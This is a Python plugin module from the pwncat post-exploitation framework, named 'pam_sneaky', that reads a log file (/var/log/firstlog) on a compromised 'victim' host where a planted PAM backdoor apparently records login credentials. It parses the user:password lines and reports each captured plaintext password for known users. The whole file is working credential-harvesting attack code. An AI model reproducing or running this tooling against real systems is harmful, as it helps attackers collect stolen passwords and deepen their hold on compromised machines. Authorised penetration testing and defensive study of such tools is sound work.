#!/usr/bin/env python3
import dataclasses
from typing import Generator

from colorama import Fore

import pwncat
from pwncat.enumerate import FactData

name = "pwncat.enumerate.pam_sneaky"
per_user = False
always_run = True
provides = "system.user.password"


@dataclasses.dataclass
class UserPassword(FactData):
    """ User password data found in the pam_sneaky log file """

    uid: int
    password: str

    def __str__(self):
        return f"Password for {Fore.GREEN}{self.user.name}{Fore.RESET}: {Fore.BLUE}{repr(self.password)}{Fore.RESET}"

    @property
    def user(self):
        return pwncat.victim.find_user_by_id(self.uid)


def enumerate() -> Generator[FactData, None, None]:
    """
    Enumerate any passwords found in the pam_sneaky log file.

    :return: Generators the passwords for the users
    """

    observed = []

    try:
        with pwncat.victim.open("/var/log/firstlog", "r") as filp:
            for line in filp:
                line = line.strip()
                if line in observed:
                    continue

                user, *password = line.split(":")
                password = ":".join(password)
                if user not in pwncat.victim.users:
                    continue

                observed.append(line)

                yield UserPassword(pwncat.victim.users[user].id, password)
    except (FileNotFoundError, PermissionError):
        pass
